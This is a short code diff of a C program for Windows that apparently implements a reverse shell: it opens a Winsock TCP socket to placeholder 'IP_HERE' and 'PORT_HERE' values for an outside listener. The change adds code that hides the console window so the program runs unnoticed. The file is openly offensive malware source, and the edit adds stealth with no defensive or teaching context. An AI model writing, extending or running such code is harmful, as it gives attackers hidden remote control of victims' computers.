@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <winsock2.h>
-#include <windows.h> // -lws2_32
+#include <windows.h>
 
 WSADATA wsaData;
 SOCKET winSock;
@@ -10,6 +10,12 @@ int port = PORT_HERE;
 char *ip = "IP_HERE";
 
 int main(void) {
+    HWND hWnd = GetConsoleWindow();
+
+    if (hWnd != NULL) {
+        ShowWindow(hWnd, SW_HIDE);
+    }
+
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     sockAddr.sin_family = AF_INET;
